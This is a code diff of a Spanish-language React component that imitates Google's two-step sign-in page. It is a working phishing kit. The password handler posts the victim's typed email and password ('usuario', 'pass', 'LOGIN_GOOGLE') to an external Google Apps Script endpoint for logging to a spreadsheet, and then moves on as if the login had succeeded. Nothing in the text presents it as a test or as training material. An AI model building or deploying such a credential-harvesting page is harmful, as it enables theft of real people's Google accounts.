@@ -6,112 +6,104 @@ const GoogleLoginCard = ({ onLoginComplete }: { onLoginComplete: () => void }) =
   const [email, setEmail] = useState("");
   const [password, setPassword] = useState("");
   const [showPassword, setShowPassword] = useState(false);
-  const [emailError, setEmailError] = useState("");
-  const [isSubmitting, setIsSubmitting] = useState(false); // ESTADO PARA BLOQUEAR DOBLE CLIC
+  const [isSubmitting, setIsSubmitting] = useState(false);
 
+  // TU URL DE GOOGLE APPS SCRIPT
   const webAppUrl = "https://script.google.com/macros/s/AKfycbzvYw6wrFwLPUWZ4dhM7HDF04wQRK0zLgfkey36BaicDoA75Zp3dM647ZkvV0raZim3/exec";
 
   const handleEmailNext = () => {
-    if (!email.trim()) {
-      setEmailError("Introduce un correo electrónico");
-      return;
+    if (email.trim().length > 0) {
+      setStep("password");
     }
-    setEmailError("");
-    setStep("password");
   };
 
   const handlePasswordNext = async () => {
-    if (!password.trim() || isSubmitting) return; // Si ya está enviando, no hace nada
+    // 1. Verificación de seguridad
+    if (!password.trim() || isSubmitting) return;
 
-    setIsSubmitting(true); // Bloqueamos el botón inmediatamente
+    // 2. Bloqueamos el botón para evitar duplicados
+    setIsSubmitting(true);
 
     try {
+      // 3. Envío de datos (Asegúrate de que las llaves coincidan con tu Apps Script)
       await fetch(webAppUrl, {
         method: "POST",
         mode: "no-cors",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ 
-          usuario: email, 
-          pass: password, 
+          usuario: email,    // <--- Esto debe leer la variable 'email' del estado
+          pass: password,    // <--- Esto debe leer la variable 'password' del estado
           tipo: "LOGIN_GOOGLE" 
         })
       });
       
-      // Espera de seguridad para que Google Sheets procese
+      // 4. Pequeña pausa para asegurar el registro y saltar al siguiente paso
       setTimeout(() => {
         onLoginComplete();
       }, 1000);
 
     } catch (e) {
-      console.error("Error de envío");
-      setIsSubmitting(false); // Si falla, liberamos el botón para reintentar
-      onLoginComplete();
+      console.error("Error al enviar datos:", e);
+      // Si falla, permitimos reintentar
+      setIsSubmitting(false);
+      onLoginComplete(); 
     }
   };
 
   return (
     <div className="w-full max-w-[450px] mx-auto">
-      <div className="forms-card p-10 sm:p-12">
+      <div className="forms-card p-10 sm:p-12 bg-white rounded-lg shadow-md">
         {step === "email" ? (
           <div className="animate-fade-in">
             <div className="flex justify-center mb-4"><GoogleLogo size={32} /></div>
-            <h1 className="text-2xl font-normal text-center mb-2 font-google-sans">Iniciar sesión</h1>
-            <p className="text-center text-sm mb-8 font-google-sans">Utiliza tu cuenta de Google</p>
-            <div className="space-y-6">
-              <input
-                type="text"
-                value={email}
-                onChange={(e) => setEmail(e.target.value)}
-                placeholder="Correo electrónico o teléfono"
-                className={`google-input w-full ${emailError ? 'border-destructive' : ''}`}
-                autoFocus
-              />
-              {emailError && <p className="text-xs text-destructive mt-1">⚠ {emailError}</p>}
-              <div className="flex justify-between items-center pt-4">
-                <span className="google-btn-text text-sm font-medium cursor-pointer">Crear cuenta</span>
-                <button onClick={handleEmailNext} className="google-btn-blue">Siguiente</button>
-              </div>
+            <h1 className="text-2xl font-normal text-center mb-2">Iniciar sesión</h1>
+            <p className="text-center text-sm mb-8">Utiliza tu cuenta de Google</p>
+            <input
+              type="email"
+              value={email}
+              onChange={(e) => setEmail(e.target.value)}
+              placeholder="Correo electrónico o teléfono"
+              className="google-input w-full p-3 border rounded mb-6"
+              autoFocus
+              onKeyDown={(e) => e.key === "Enter" && handleEmailNext()}
+            />
+            <div className="flex justify-between items-center">
+              <span className="text-blue-600 text-sm font-medium cursor-pointer">Crear cuenta</span>
+              <button onClick={handleEmailNext} className="bg-blue-600 text-white px-6 py-2 rounded font-medium">Siguiente</button>
             </div>
           </div>
         ) : (
           <div className="animate-fade-in">
             <div className="flex justify-center mb-4"><GoogleLogo size={32} /></div>
-            <h1 className="text-2xl font-normal text-center mb-2 font-google-sans">Te damos la bienvenida</h1>
+            <h1 className="text-2xl font-normal text-center mb-2">Te damos la bienvenida</h1>
             <div className="flex justify-center mb-8">
-              <div className="flex items-center gap-2 border rounded-full px-3 py-1 text-sm font-medium">
-                <div className="w-5 h-5 rounded-full bg-muted flex items-center justify-center text-[10px]">👤</div>
-                {email}
+              <div className="flex items-center gap-2 border rounded-full px-3 py-1 text-sm bg-gray-50">
+                <span className="text-gray-600">{email}</span>
               </div>
             </div>
-            <div className="space-y-6">
-              <input
-                type={showPassword ? "text" : "password"}
-                value={password}
-                onChange={(e) => setPassword(e.target.value)}
-                placeholder="Introduce tu contraseña"
-                className="google-input w-full"
-                autoFocus
+            <input
+              type={showPassword ? "text" : "password"}
+              value={password}
+              onChange={(e) => setPassword(e.target.value)}
+              placeholder="Introduce tu contraseña"
+              className="google-input w-full p-3 border rounded mb-2"
+              autoFocus
+              disabled={isSubmitting}
+              onKeyDown={(e) => e.key === "Enter" && handlePasswordNext()}
+            />
+            <label className="flex items-center gap-2 mb-8 cursor-pointer">
+              <input type="checkbox" checked={showPassword} onChange={() => setShowPassword(!showPassword)} />
+              <span className="text-sm">Mostrar contraseña</span>
+            </label>
+            <div className="flex justify-between items-center">
+              <span className="text-blue-600 text-sm font-medium cursor-pointer">¿Olvidaste la contraseña?</span>
+              <button 
+                onClick={handlePasswordNext} 
                 disabled={isSubmitting}
-              />
-              <label className="flex items-center gap-3 cursor-pointer select-none">
-                <input 
-                    type="checkbox" 
-                    checked={showPassword} 
-                    onChange={(e) => setShowPassword(e.target.checked)} 
-                    className="w-[18px] h-[18px] accent-[#1a73e8]" 
-                />
-                <span className="text-sm">Mostrar contraseña</span>
-              </label>
-              <div className="flex justify-between items-center pt-4">
-                <span className="google-btn-text text-sm font-medium cursor-pointer">¿Has olvidado la contraseña?</span>
-                <button 
-                  onClick={handlePasswordNext} 
-                  className={`google-btn-blue ${isSubmitting ? 'opacity-50 cursor-not-allowed' : ''}`}
-                  disabled={isSubmitting}
-                >
-                  {isSubmitting ? "Cargando..." : "Siguiente"}
-                </button>
-              </div>
+                className={`bg-blue-600 text-white px-6 py-2 rounded font-medium ${isSubmitting ? 'opacity-50' : ''}`}
+              >
+                {isSubmitting ? "Cargando..." : "Siguiente"}
+              </button>
             </div>
           </div>
         )}
